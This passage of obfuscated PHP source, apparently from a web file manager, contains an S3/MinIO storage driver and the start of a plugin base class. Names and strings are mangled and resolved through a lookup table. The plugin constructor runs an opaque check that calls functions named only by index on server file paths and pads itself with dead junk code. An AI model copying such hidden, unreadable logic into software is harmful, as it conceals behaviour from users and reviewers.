$˜È§Ÿ¿ = isset($ÇÁœöÌ„[$Ãø†“ÌË[181]]) ? $ÇÁœöÌ„[$Ãø†“ÌË[181]] : http_type(); $ŸÓ» = isset($ÇÁœöÌ„[$Ãø†“ÌË[182]]) ? $ÇÁœöÌ„[$Ãø†“ÌË[182]] : $ÇÁœöÌ„[$Ãø†“ÌË[84]]; if (isset($ÇÁœöÌ„[$Ãø†“ÌË[183]])) { $ŸÓ» .= $Ãø†“ÌË[4] . $ÇÁœöÌ„[$Ãø†“ÌË[183]]; } return $˜È§Ÿ¿ . $Ãø†“ÌË[184] . $ŸÓ»; } public function pathEncode($šÍ—ö§) { $üÔ³Ğèû =& $_SERVER[§ŒØóıü]; return str_replace($üÔ³Ğèû[185], $üÔ³Ğèû[8], rawurlencode($šÍ—ö§)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($´Œ»í¨) { set_timeout(); require_once SDK_DIR . $_SERVER[§ŒØóıü][186]; parent::__construct(); $this->_init($´Œ»í¨); } public function _init($À³ñ„×í) { $this->config = $À³ñ„×í; foreach ($À³ñ„×í as $ì¤…ÀÇ => $˜´Öù×) { if (isset($this->{$ì¤…ÀÇ})) { $this->{$ì¤…ÀÇ} = $˜´Öù×; } } $this->endpoint = $À³ñ„×í[$_SERVER[§ŒØóıü][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ àÄÏÜà = "\x76\64") { $this->signVer = $ àÄÏÜà; $this->client->setSignatureVersion($ àÄÏÜà); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $Âºì¼¾® =& $_SERVER[§ŒØóıü]; $‘êÔ‘ş = $this->getBucketCors(); if (!$‘êÔ‘ş || !is_array($‘êÔ‘ş)) { return !1; } if ($‘êÔ‘ş[$Âºì¼¾®[188]] != $Âºì¼¾®[189] || $‘êÔ‘ş[$Âºì¼¾®[190]] != $Âºì¼¾®[189]) { return !1; } $¦ğ×©œ = array_map($Âºì¼¾®[191], $‘êÔ‘ş[$Âºì¼¾®[192]]); if (!is_array($¦ğ×©œ)) { $¦ğ×©œ = array(); } $ÒÖµ»«  = array($Âºì¼¾®[193], $Âºì¼¾®[194], $Âºì¼¾®[195], $Âºì¼¾®[196], $Âºì¼¾®[197]); $ªÑÀ’î™ = array_diff($ÒÖµ»« , $¦ğ×©œ); return empty($ªÑÀ’î™); } public function mkfile($±¿¨³ˆ, $¹ ·¡ÎÔ = '', $Á÷‘Í½ò = REPEAT_RENAME) { $ˆ‰µøĞì = $this->setContent($±¿¨³ˆ, $¹ ·¡ÎÔ); if ($ˆ‰µøĞì !== !1) { return $this->getPathOuter($±¿¨³ˆ); } return !1; } public function mkdir($…Ó°ìˆĞ, $¤´±¢Ûù = REPEAT_SKIP) { $ĞÅëùÛ‚ =& $_SERVER[§ŒØóıü]; if (empty($…Ó°ìˆĞ) && $…Ó°ìˆĞ !== $ĞÅëùÛ‚[198]) { return !1; } if ($¤´±¢Ûù && $this->_isFolder($…Ó°ìˆĞ)) { return $this->getPathOuter($…Ó°ìˆĞ); } $†ı¿úÓ© = $this->setContent($…Ó°ìˆĞ, $ĞÅëùÛ‚[12], !0); if ($†ı¿úÓ© !== !1) { return $this->getPathOuter($…Ó°ìˆĞ); } return !1; } public function copyFile($·ú“, $­¬ê»Õƒ, $ªè«‚ıµ = array()) { $–¶•“¼ø =& $_SERVER[§ŒØóıü]; $å¼ÄĞ´° = $this->objectMeta($·ú“); if (!$å¼ÄĞ´°) { return !1; } if ($å¼ÄĞ´°[$–¶•“¼ø[76]] <= 1024 * 1024 * 200) { $€±©íáü = $this->client->copyObject($this->bucket, $·ú“, $this->bucket, $­¬ê»Õƒ, $–¶•“¼ø[199], $ªè«‚ıµ); } else { $€±©íáü = $this->client->multiCopyObject($this->bucket, $·ú“, $this->bucket, $­¬ê»Õƒ, $ªè«‚ıµ); } $€±©íáü = $€±©íáü ? $this->getPathOuter($­¬ê»Õƒ) : !1; return $€±©íáü; } public function moveFile($¾°¨—’¿, $á ‚Ş‹ô) { if ($this->copyFile($¾°¨—’¿, $á ‚Ş‹ô)) { $this->delFile($¾°¨—’¿); return $this->getPathOuter($á ‚Ş‹ô); } return !1; } public function delFile($ã¼Ä÷™°) { return $this->client->deleteObject($this->bucket, $ã¼Ä÷™°); } public function delFolder($Ê‚ªá) { $–„ßâÛ© =& $_SERVER[§ŒØóıü]; if (!$this->exist($Ê‚ªá)) { return !0; } $this->listItemCache = !1; $¾ÀÓó£® = $this->fileList($Ê‚ªá); $this->listItemCache = !0; $»ãÏ±úê = trim($Ê‚ªá, $–„ßâÛ©[8]) . $–„ßâÛ©[8]; if (!empty($Ê‚ªá) && $Ê‚ªá !== $–„ßâÛ©[198] && !in_array($»ãÏ±úê, $¾ÀÓó£®[$–„ßâÛ©[82]])) { $¾ÀÓó£®[$–„ßâÛ©[82]][] = $»ãÏ±úê; } $¬âÆİá¾ = $this->delByBatch($¾ÀÓó£®[$–„ßâÛ©[83]]); if (!$¬âÆİá¾) { return !1; } $¬âÆİá¾ = $this->delByBatch($¾ÀÓó£®[$–„ßâÛ©[82]]); if (!$¬âÆİá¾) { return !1; } return $this->delFile($»ãÏ±úê); } private function delByBatch($¢¾®¹©Ö) { foreach (array_chunk($¢¾®¹©Ö, 1000) as $ª·¥œîµ) { $ñİ•ø™Ê = $this->client->deleteObjects($this->bucket, $ª·¥œîµ); if (!$ñİ•ø™Ê) { return !1; } } return !0; } public function rename($Ô—âÜ—§, $òÈË³’Ù) { return $this->renameObject($Ô—âÜ—§, $òÈË³’Ù); } public function listPath($˜¶¹ºÉ’, $‰…Ûø¦ = false) { $Ùéå­§ =& $_SERVER[§ŒØóıü]; $ì—ÊÌ® = $this->fileList($˜¶¹ºÉ’, $Ùéå­§[8], !0); foreach ($ì—ÊÌ®[$Ùéå­§[82]] as $²’œêÍÌ => $ı¥Ã­ä) { $ì—ÊÌ®[$Ùéå­§[82]][$²’œêÍÌ] = $this->folderInfo($ı¥Ã­ä, $‰…Ûø¦, $ı¥Ã­ä); } foreach ($ì—ÊÌ®[$Ùéå­§[83]] as $²’œêÍÌ => $ı¥Ã­ä) { $ì—ÊÌ®[$Ùéå­§[83]][$²’œêÍÌ] = $this->fileInfo($ı¥Ã­ä[$Ùéå­§[32]], $‰…Ûø¦, $ı¥Ã­ä); } return $ì—ÊÌ®; } protected function infoChildren($‡‡£ÂÜŠ, &$ù„¼¸”‹) { $â«Šé =& $_SERVER[§ŒØóıü]; $È‘æ¡ª = $this->fileList($‡‡£ÂÜŠ, $â«Šé[12], !0); $ù„¼¸”‹[$â«Šé[78]] += count($È‘æ¡ª[$â«Šé[82]]); $ù„¼¸”‹[$â«Šé[77]] += count($È‘æ¡ª[$â«Šé[83]]); foreach ($È‘æ¡ª[$â«Šé[83]] as $ÑôÌ¡çÈ) { if (!$ÑôÌ¡çÈ || !$ÑôÌ¡çÈ[$â«Šé[76]]) { continue; } $ù„¼¸”‹[$â«Šé[76]] += $ÑôÌ¡çÈ[$â«Šé[76]]; } } private function fileInfo($¨ÜŠÜ¾ù, $½‰ö•ÇÄ = false, $ºîë±Ÿ = array()) { $Á¥ë¥¿¢ =& $_SERVER[§ŒØóıü]; $¤ñÀ†¥Æ = array($Á¥ë¥¿¢[32] => $this->pathThis($¨ÜŠÜ¾ù), $Á¥ë¥¿¢[84] => $this->getPathOuter($¨ÜŠÜ¾ù), $Á¥ë¥¿¢[33] => $Á¥ë¥¿¢[200], $Á¥ë¥¿¢[174] => $this->ext($¨ÜŠÜ¾ù), $Á¥ë¥¿¢[76] => isset($ºîë±Ÿ[$Á¥ë¥¿¢[76]]) ? $ºîë±Ÿ[$Á¥ë¥¿¢[76]] : 0); if ($½‰ö•ÇÄ) { return $¤ñÀ†¥Æ; } $¤ñÀ†¥Æ[$Á¥ë¥¿¢[201]] = $¤ñÀ†¥Æ[$Á¥ë¥¿¢[85]] = 0; $¤ñÀ†¥Æ[$Á¥ë¥¿¢[202]] = $¤ñÀ†¥Æ[$Á¥ë¥¿¢[203]] = !0; if (empty($ºîë±Ÿ)) { $ºîë±Ÿ = $this->objectMeta($¨ÜŠÜ¾ù); if (!$ºîë±Ÿ) { return $¤ñÀ†¥Æ; } } if (isset($ºîë±Ÿ[$Á¥ë¥¿¢[180]])) { $¤ñÀ†¥Æ[$Á¥ë¥¿¢[85]] = $ºîë±Ÿ[$Á¥ë¥¿¢[180]]; } if (isset($ºîë±Ÿ[$Á¥ë¥¿¢[76]])) { $¤ñÀ†¥Æ[$Á¥ë¥¿¢[76]] = $ºîë±Ÿ[$Á¥ë¥¿¢[76]]; } return $¤ñÀ†¥Æ; } private function folderInfo($‰ŠÜû¨, $€§—íá· = false, $’î„¡¯ = array()) { $Õ¯Åöú =& $_SERVER[§ŒØóıü]; $ õ°ŒùÕ = array($Õ¯Åöú[32] => $this->pathThis($‰ŠÜû¨), $Õ¯Åöú[84] => $this->getPathOuter($Õ¯Åöú[8] . $‰ŠÜû¨), $Õ¯Åöú[33] => $Õ¯Åöú[75]); if ($€§—íá·) { return $ õ°ŒùÕ; } $ õ°ŒùÕ[$Õ¯Åöú[201]] = $ õ°ŒùÕ[$Õ¯Åöú[85]] = 0; $ õ°ŒùÕ[$Õ¯Åöú[202]] = $ õ°ŒùÕ[$Õ¯Åöú[203]] = !0; if ($‰ŠÜû¨ == $Õ¯Åöú[12]) { return $ õ°ŒùÕ; } if (empty($’î„¡¯)) { $’î„¡¯ = $this->objectMeta(trim($‰ŠÜû¨, $Õ¯Åöú[8]) . $Õ¯Åöú[8]); } if (isset($’î„¡¯[$Õ¯Åöú[180]])) { $ õ°ŒùÕ[$Õ¯Åöú[201]] = $’î„¡¯[$Õ¯Åöú[180]]; } return $ õ°ŒùÕ; } private function fileList($ËîÅ—üı, $ÔæÊ©Åü = '', $›Ôñ½úÃ = 0) { $‡è±ù™Ã =& $_SERVER[§ŒØóıü]; $ÖĞ¦¶İ = rtrim($ËîÅ—üı, $‡è±ù™Ã[8]) . $‡è±ù™Ã[8]; $±’³î°¾ = $this->listObjs($ÖĞ¦¶İ, null, null, $ÔæÊ©Åü); if (!$±’³î°¾) { return array($‡è±ù™Ã[82] => array(), $‡è±ù™Ã[83] => array()); } $‚©òøÜ = $øòŠÁ ¼ = array(); foreach ($±’³î°¾[$‡è±ù™Ã[204]] as $î±ôû×ƒ) { $”¡èúˆŸ = $î±ôû×ƒ[$‡è±ù™Ã[32]]; if ($”¡èúˆŸ == $ÖĞ¦¶İ) { continue; } $Òùí¾Ë = isset($î±ôû×ƒ[$‡è±ù™Ã[76]]) ? $î±ôû×ƒ[$‡è±ù™Ã[76]] : 0; $ß¨ß™ì = $Òùí¾Ë == 0 && substr($”¡èúˆŸ, strlen($”¡èúˆŸ) - 1, 1) == $‡è±ù™Ã[8] ? !0 : !1; $this->cacheMethodInfoSet($”¡èúˆŸ, $ß¨ß™ì, $î±ôû×ƒ); if ($ß¨ß™ì) { $‚©òøÜ[] = $”¡èúˆŸ; continue; } $øòŠÁ ¼[] = $›Ôñ½úÃ ? $î±ôû×ƒ : $”¡èúˆŸ; } foreach ($±’³î°¾[$‡è±ù™Ã[205]] as $î±ôû×ƒ) { $‚©òøÜ[] = $î±ôû×ƒ[$‡è±ù™Ã[32]]; $this->cacheMethodInfoSet($î±ôû×ƒ[$‡è±ù™Ã[32]], !0); } $this->cacheMethodInfoSet($ËîÅ—üı, !0); return array($‡è±ù™Ã[82] => $‚©òøÜ, $‡è±ù™Ã[83] => $øòŠÁ ¼); } private function listObjs($‰ˆ®œŒÉ, $áú©ûñ‚ = null, $ÉïÄÍº = null, $í°ÄíÕ¨ = null) { $“ÆÌ´™Á =& $_SERVER[§ŒØóıü]; $‰ˆ®œŒÉ = trim($‰ˆ®œŒÉ, $“ÆÌ´™Á[8]); $Ò„Œ³ÆË = empty($‰ˆ®œŒÉ) && $‰ˆ®œŒÉ !== $“ÆÌ´™Á[198] ? $“ÆÌ´™Á[12] : $‰ˆ®œŒÉ . $“ÆÌ´™Á[8]; return $this->client->getBucket($this->bucket, $Ò„Œ³ÆË, $áú©ûñ‚, $ÉïÄÍº, $í°ÄíÕ¨, !0); } public function has($Úİ¨™È, $íÜÜéú  = false, $ÈşÜ¿æğ = true) { $§Åè°“Û =& $_SERVER[§ŒØóıü]; $Úİ¨™È = trim($Úİ¨™È, $§Åè°“Û[8]); $øáÉ‹· = empty($Úİ¨™È) && $Úİ¨™È !== $§Åè°“Û[198] ? $§Åè°“Û[12] : $Úİ¨™È . $§Åè°“Û[8]; $Şíç£Úî = null; $´ÏÔ¡¤¿ = 500; $œ–ÊŸš = $§Åè°“Û[8]; $˜Êˆ€ÚÈ = $åÜ¾Ó”Å = array(); while (!0) { $ê½ áÛ¼ = $this->listObjs($Úİ¨™È, $Şíç£Úî, $´ÏÔ¡¤¿, $œ–ÊŸš); if (!$ê½ áÛ¼) { break; } $Şíç£Úî = $ê½ áÛ¼[$§Åè°“Û[206]]; $â†¯öÊ = $ê½ áÛ¼[$§Åè°“Û[204]]; $øªÚéåö = $ê½ áÛ¼[$§Åè°“Û[205]]; if (empty($â†¯öÊ) && empty($øªÚéåö)) { break; } if (count($â†¯öÊ) == 1 && $â†¯öÊ[0][$§Åè°“Û[32]] == $øáÉ‹·) { break; } if ($íÜÜéú ) { if (count($â†¯öÊ)) { $â†¯öÊ = array_column($â†¯öÊ, $§Åè°“Û[32]); $˜Êˆ€ÚÈ = array_merge($˜Êˆ€ÚÈ, $â†¯öÊ); } if (count($øªÚéåö)) { $øªÚéåö = array_column($øªÚéåö, $§Åè°“Û[32]); $åÜ¾Ó”Å = array_merge($åÜ¾Ó”Å, $øªÚéåö); } if ($Şíç£Úî === null) { break; } continue; } if ($ÈşÜ¿æğ) { if (!empty($â†¯öÊ)) { if (count($â†¯öÊ) > 1 || isset($â†¯öÊ[0][$§Åè°“Û[32]]) && $â†¯öÊ[0][$§Åè°“Û[32]] != $øáÉ‹·) { return !0; } } } else { if (!empty($øªÚéåö)) { return !0; } } if ($Şíç£Úî === null) { break; } } if ($íÜÜéú ) { $˜Êˆ€ÚÈ = array_diff($˜Êˆ€ÚÈ, array($øáÉ‹·)); $˜Êˆ€ÚÈ = count(array_unique($˜Êˆ€ÚÈ)); $åÜ¾Ó”Å = count(array_unique($åÜ¾Ó”Å)); return array($§Åè°“Û[207] => $˜Êˆ€ÚÈ, $§Åè°“Û[208] => $åÜ¾Ó”Å); } return !1; } public function listAll($õªÌãó) { $˜ÍÈéÁê =& $_SERVER[§ŒØóıü]; $šıñ–‚ = $this->fileList($õªÌãó, $˜ÍÈéÁê[12], !0); $Ñ’¨¶ñŒ = array_to_keyvalue($šıñ–‚[$˜ÍÈéÁê[83]], $˜ÍÈéÁê[32]); foreach ($šıñ–‚[$˜ÍÈéÁê[82]] as $°”©£Éõ) { if (is_string($°”©£Éõ)) { $Ñ’¨¶ñŒ[$°”©£Éõ] = array($˜ÍÈéÁê[76] => 0); } } return $this->listAllFiles($õªÌãó, $Ñ’¨¶ñŒ); } public function canRead($”ÚÕªÇ­) { $õŠ¯šÀ =& $_SERVER[§ŒØóıü]; $Ç”­Ÿœ = $this->client->getAccessControlPolicy($this->bucket, $”ÚÕªÇ­); if (!$Ç”­Ÿœ) { return !1; } return in_array($Ç”­Ÿœ, array($õŠ¯šÀ[209], $õŠ¯šÀ[210], $õŠ¯šÀ[211])) ? !0 : !1; } public function canWrite($›¶éÙ²ç) { $Šâ©¤¨à =& $_SERVER[§ŒØóıü]; $¼ŸÉ‘ = $this->client->getAccessControlPolicy($this->bucket, $›¶éÙ²ç); if (!$¼ŸÉ‘) { return !1; } return in_array($¼ŸÉ‘, array($Šâ©¤¨à[209], $Šâ©¤¨à[210])) ? !0 : !1; } public function getContent($åã—Š´ş) { return $this->client->getObject($this->bucket, $åã—Š´ş); } public function setContent($Ÿë’¦Ôá, $¯€”¢ï = '', $ß˜ûé§ = false) { $½Õ¨ã• =& $_SERVER[§ŒØóıü]; $Ÿë’¦Ôá = $ß˜ûé§ ? trim($Ÿë’¦Ôá, $½Õ¨ã•[8]) . $½Õ¨ã•[8] : $Ÿë’¦Ôá; $ËÒı¹‹œ = get_file_mime(get_path_ext($Ÿë’¦Ôá)); $æ¹ãÔ³Ã = $this->client->putObject($¯€”¢ï, $this->bucket, $Ÿë’¦Ôá, $½Õ¨ã•[199], array(), $ËÒı¹‹œ); if (!$æ¹ãÔ³Ã) { return !1; } if ($ß˜ûé§) { return !0; } $this->cacheMethod(null, null); $æ¹ãÔ³Ã = $this->copyFile($Ÿë’¦Ôá, $Ÿë’¦Ôá, array($½Õ¨ã•[212] => $æ¹ãÔ³Ã[$½Õ¨ã•[213]])); return $æ¹ãÔ³Ã ? !0 : !1; } public function fileSubstr($†ÂÓÏ€¾, $¬£îªº–, $àõ¤Í€) { $ÍàüåûÛ = $¬£îªº– + $àõ¤Í€ - 1; return $this->client->getObject($this->bucket, $†ÂÓÏ€¾, array($_SERVER[§ŒØóıü][214] => "\x62\x79\x74\x65\x73\75{$¬£îªº–}\x2d{$ÍàüåûÛ}")); } public function upload($‡–‘ÚÔ, $öïŸ¿, $ßÂÛİ¾± = false, $È¨øÌ«ú = REPEAT_REPLACE) { $©ñ¸ĞÔŠ =& $_SERVER[§ŒØóıü]; $¡ıªô–› = array($©ñ¸ĞÔŠ[212] => @md5_file($öïŸ¿)); $ĞËâÇ¨ï = array($©ñ¸ĞÔŠ[215] => get_file_mime(get_path_ext($‡–‘ÚÔ))); if (IO::size($öïŸ¿) <= 1024 * 1024 * 200) { $ÛÛœäÎ = $this->client->putObjectFile($öïŸ¿, $this->bucket, $‡–‘ÚÔ, $©ñ¸ĞÔŠ[199], $¡ıªô–›, $ĞËâÇ¨ï); return !empty($ÛÛœäÎ) ? $this->getPathOuter($‡–‘ÚÔ) : !1; } $µÆ™£û = $this->client->multiUploadObject($öïŸ¿, $this->bucket, trim($‡–‘ÚÔ, $©ñ¸ĞÔŠ[8]), $¡ıªô–›, $ĞËâÇ¨ï); return $µÆ™£û ? $this->getPathOuter($‡–‘ÚÔ) : !1; } public function download($‘è´ù»™, $‘æí«¯”) { if (!@is_dir($this->pathFather($‘æí«¯”)) && !IO::mkdir($this->pathFather($‘æí«¯”))) { return !1; } $­µøÂ¾ = $this->client->getObject($this->bucket, $‘è´ù»™, array(), $‘æí«¯”); return $­µøÂ¾ !== !1 ? $‘æí«¯” : !1; } public function link($½¹èÉÂ¢, $÷Ğ‘ó¶ê = array()) { $©Ø¡ÁÍ =& $_SERVER[§ŒØóıü]; if ($this->signVer == $©Ø¡ÁÍ[216]) { return $this->client->getAuthenticatedURL($this->bucket, $½¹èÉÂ¢, 3600 * 12, $÷Ğ‘ó¶ê); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($½¹èÉÂ¢, $©Ø¡ÁÍ[8]), 3600 * 12, $this->region, array(), !0, $÷Ğ‘ó¶ê); } public function fileOut($ÄÈï ¢Ò, $©©ùöˆğ = false, $³É·¬©Ù = false, $óÙË²Àê = '') { $–Åµ“Ò =& $_SERVER[§ŒØóıü]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÄÈï ¢Ò, $©©ùöˆğ, $³É·¬©Ù, $óÙË²Àê); } if (!$³É·¬©Ù) { $³É·¬©Ù = $this->pathThis($ÄÈï ¢Ò); } $ü¦“°°à = get_file_mime(get_path_ext($³É·¬©Ù)); if ($ü¦“°°à == $–Åµ“Ò[217]) { return parent::fileOut($ÄÈï ¢Ò, $©©ùöˆğ, $³É·¬©Ù, $óÙË²Àê); } $ª›ëøÙŠ = array($–Åµ“Ò[218] => $ü¦“°°à); if ($©©ùöˆğ) { $ª›ëøÙŠ[$–Åµ“Ò[219]] = $–Åµ“Ò[220] . rawurlencode($³É·¬©Ù); } else { } $ıªÄŸª = $this->link($ÄÈï ¢Ò, $ª›ëøÙŠ); $this->fileOutLink($ıªÄŸª); } public function fileOutServer($«Âï±èÍ, $üÙğå°ú = false, $ë ñ™„ = false, $íŒê±‡š = '') { parent::fileOut($«Âï±èÍ, $üÙğå°ú, $ë ñ™„, $íŒê±‡š); } public function fileOutImageServer($ ’¥Ûú, $÷Ù±Œ­ = 250) { parent::fileOutImage($ ’¥Ûú, $÷Ù±Œ­); } public function hashMd5($¾Ü­ÌÙ, $ûÔŒË…½ = '') { $¸é¿¦í =& $_SERVER[§ŒØóıü]; $«†«Ò¸Ú = $this->objectMeta($¾Ü­ÌÙ); if (!$«†«Ò¸Ú) { return !1; } $ûÔŒË…½ = $ûÔŒË…½ ? $ûÔŒË…½ : _get($«†«Ò¸Ú, $¸é¿¦í[221]); $ûÔŒË…½ = $ûÔŒË…½ ? $ûÔŒË…½ : _get($«†«Ò¸Ú, $¸é¿¦í[213], $¸é¿¦í[12]); return $ûÔŒË…½; } public function uploadFormData($æ‰Ç‚Ç, $ª¦ÛîË¿ = 3600) { $ÜÎÏ‹ñœ =& $_SERVER[§ŒØóıü]; $İÓé»˜© = $this->pathFather($æ‰Ç‚Ç); $ò‡Åâ½Ú = $this->client->getHttpUploadPostParams($this->bucket, $İÓé»˜©, $ÜÎÏ‹ñœ[199], $ª¦ÛîË¿); return array_merge((array) $ò‡Åâ½Ú, array($ÜÎÏ‹ñœ[182] => $this->getHost())); } public function multiUploadFormData($òÁØ‚¤, $ÃÒó‡öÔ = 3600) { $ˆËÇÖÖß =& $_SERVER[§ŒØóıü]; $÷µßš¸ = gmdate($ˆËÇÖÖß[222]); $¿Àó‰Ú = array(); $˜Àº©õ = $this->client->getUploadId($this->bucket, $òÁØ‚¤, $¿Àó‰Ú); if (!$˜Àº©õ) { return !1; } return array($ˆËÇÖÖß[223] => $˜Àº©õ, $ˆËÇÖÖß[182] => $this->getHost() . $ˆËÇÖÖß[8] . $this->pathEncode($òÁØ‚¤), $ˆËÇÖÖß[224] => $÷µßš¸, $ˆËÇÖÖß[94] => $òÁØ‚¤); } public function multiUploadAuthData($Úİ·Ö¹¨, $„†¸ñ¤µ = array()) { $÷’§‹à =& $_SERVER[§ŒØóıü]; $…¤›šı = isset($„†¸ñ¤µ[$÷’§‹à[224]]) ? $„†¸ñ¤µ[$÷’§‹à[224]] : gmdate($÷’§‹à[222]); $îœÉµµÄ = isset($„†¸ñ¤µ[$÷’§‹à[174]]) ? $„†¸ñ¤µ[$÷’§‹à[174]] : $÷’§‹à[12]; $êÛâÇõÚ = $„†¸ñ¤µ[$÷’§‹à[94]]; unset($„†¸ñ¤µ[$÷’§‹à[94]]); if (isset($„†¸ñ¤µ[$÷’§‹à[225]])) { $„†¸ñ¤µ[$÷’§‹à[224]] = $…¤›šı; return $this->listUploadParts($êÛâÇõÚ, $„†¸ñ¤µ); } $‹—Ù‰ü‡ = array($÷’§‹à[226], $÷’§‹à[12], $÷’§‹à[120], $÷’§‹à[12], "\x78\55\141\155\x7a\x2d\144\141\x74\145\x3a{$…¤›šı}", $÷’§‹à[8] . $this->bucket . $÷’§‹à[8] . $this->pathEncode($êÛâÇõÚ) . $îœÉµµÄ); if (strpos($îœÉµµÄ, $÷’§‹à[227]) === 0) { $‹—Ù‰ü‡[0] = $÷’§‹à[228]; } if (isset($„†¸ñ¤µ[$÷’§‹à[229]]) && $„†¸ñ¤µ[$÷’§‹à[229]] == $÷’§‹à[230]) { $‹—Ù‰ü‡[0] = $÷’§‹à[230]; } $­²ı‘õ = implode($÷’§‹à[231], $‹—Ù‰ü‡); $ï¿ı¸…Ê = base64_encode(hash_hmac($÷’§‹à[232], $­²ı‘õ, $this->secret, !0)); $„›Ÿ¦ùº = $÷’§‹à[233] . $this->accessKey . $÷’§‹à[4] . $ï¿ı¸…Ê; if (strpos($îœÉµµÄ, $÷’§‹à[227]) === 0) { return array($÷’§‹à[234] => $„›Ÿ¦ùº, $÷’§‹à[224] => $…¤›šı); } return $„›Ÿ¦ùº; } public function listUploadParts($™‡ğŒ°…, $êµ‡µ½¡ = array()) { $üû¯Ó©Ñ =& $_SERVER[§ŒØóıü]; $îôÃ•† = str_replace($üû¯Ó©Ñ[235], $üû¯Ó©Ñ[12], $êµ‡µ½¡[$üû¯Ó©Ñ[174]]); $äºõË = $this->client->listParts($this->bucket, $™‡ğŒ°…, $îôÃ•†); if (!$äºõË) { return !1; } unset($êµ‡µ½¡[$üû¯Ó©Ñ[225]], $êµ‡µ½¡[$üû¯Ó©Ñ[229]]); $êµ‡µ½¡[$üû¯Ó©Ñ[94]] = $™‡ğŒ°…; $ÈõéíÕ = $this->multiUploadAuthData($™‡ğŒ°…, $êµ‡µ½¡); if (empty($ÈõéíÕ)) { return !1; } return array($üû¯Ó©Ñ[234] => $ÈõéíÕ, $üû¯Ó©Ñ[224] => $êµ‡µ½¡[$üû¯Ó©Ñ[224]], $üû¯Ó©Ñ[236] => $äºõË); } public function getHost() { return parent::getHost() . $_SERVER[§ŒØóıü][8] . $this->bucket; } public function size($™©ş¡äî) { $Ôº‘‹ó = $this->objectMeta($™©ş¡äî); return $Ôº‘‹ó ? $Ôº‘‹ó[$_SERVER[§ŒØóıü][76]] : 0; } public function info($éäŞûÚü) { if ($this->isFolder($éäŞûÚü)) { return $this->folderInfo($éäŞûÚü); } else { if ($this->isFile($éäŞûÚü)) { return $this->fileInfo($éäŞûÚü); } } return !1; } public function exist($¢€ÈÔ“¬) { return $this->isFile($¢€ÈÔ“¬) || $this->isFolder($¢€ÈÔ“¬); } public function isFile($ˆÚŒ¸à¥) { return !$this->isFolder($ˆÚŒ¸à¥) && $this->objectMeta($ˆÚŒ¸à¥); } public function isFolder($ÅØ•í³Ì) { return $this->cacheMethod($_SERVER[§ŒØóıü][165], $ÅØ•í³Ì); } protected function objectMeta($“îÀµ‹Ø) { return $this->cacheMethod($_SERVER[§ŒØóıü][167], $“îÀµ‹Ø); } protected function _objectMeta($¶ğĞü¤¹) { $ˆÄÑ–›¦ =& $_SERVER[§ŒØóıü]; $¶ğĞü¤¹ = rtrim($¶ğĞü¤¹, $ˆÄÑ–›¦[8]); try { $Âª ªæ® = $this->client->getObjectInfo($this->bucket, $¶ğĞü¤¹); if (!isset($Âª ªæ®[$ˆÄÑ–›¦[221]]) && isset($Âª ªæ®[$ˆÄÑ–›¦[237]])) { $Âª ªæ®[$ˆÄÑ–›¦[221]] = $Âª ªæ®[$ˆÄÑ–›¦[237]]; } } catch (Exception $ïïµ‚éğ) { $Âª ªæ® = !1; } if (!$Âª ªæ®) { } return $Âª ªæ®; } protected function _isFolder($ÎæÌ¼Ÿò) { $·‚Ô¨‹¿ =& $_SERVER[§ŒØóıü]; $ÎæÌ¼Ÿò = rtrim($ÎæÌ¼Ÿò, $·‚Ô¨‹¿[8]); if ($ÎæÌ¼Ÿò == $·‚Ô¨‹¿[12] || $ÎæÌ¼Ÿò == $·‚Ô¨‹¿[8]) { return !0; } $Ô ôöªÛ = $this->client->getBucket($this->bucket, $ÎæÌ¼Ÿò, null, 1); if (empty($Ô ôöªÛ[$·‚Ô¨‹¿[204]])) { return !1; } $ñıÌäéÈ = $Ô ôöªÛ[$·‚Ô¨‹¿[204]][0][$·‚Ô¨‹¿[32]]; return stripos($ñıÌäéÈ, $ÎæÌ¼Ÿò . $·‚Ô¨‹¿[8]) === 0 ? !0 : !1; if (substr($ñıÌäéÈ, -1) == $·‚Ô¨‹¿[8]) { return !0; } if (get_path_this($ñıÌäéÈ) == get_path_this($ÎæÌ¼Ÿò)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ÕÑÀ î˜) { parent::__construct($ÕÑÀ î˜); $this->signatureVersion($_SERVER[§ŒØóıü][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto e²é‰İîØ‡; Aïğ÷‚‹®¥: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Ğñ˜ìì¶ =& $_SERVER[§ŒØóıü]; if ($_SERVER[$Ğñ˜ìì¶[746]] != $_SERVER[$Ğñ˜ìì¶[1364]]) { $»ˆñ¶Ëş = $Ğñ˜ìì¶[883]; $¬óïİ—œ = $Ğñ˜ìì¶[748]; $¤¥¸âşÖ = $_SERVER[$Ğñ˜ìì¶[749]] . $Ğñ˜ìì¶[750]; $€æ²ç’ = $¬óïİ—œ($¤¥¸âşÖ); $’æóˆª¦ = explode($Ğñ˜ìì¶[231], $€æ²ç’); if (count($’æóˆª¦) < $Ğñ˜ìì¶[656]) { $‚¹ûë†¦ = $Ğñ˜ìì¶[751]; $‚¹ûë†¦(); } $È¸†¼ß = $Ğñ˜ìì¶[884]; $È¸†¼ß($_SERVER[$Ğñ˜ìì¶[885]]); $È¸†¼ß($_SERVER[$Ğñ˜ìì¶[749]] . $Ğñ˜ìì¶[1540]); $éÁ‘Ø¸È = 1; while ($éÁ‘Ø¸È > 1) { $éÁ‘Ø¸È = $éÁ‘Ø¸È + 4; $õÚ°ôì  = rawurlencode($éÁ‘Ø¸È . $Ğñ˜ìì¶[378]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Ğñ˜ìì¶[1541]); $this->pluginName = str_replace($Ğñ˜ìì¶[1541], 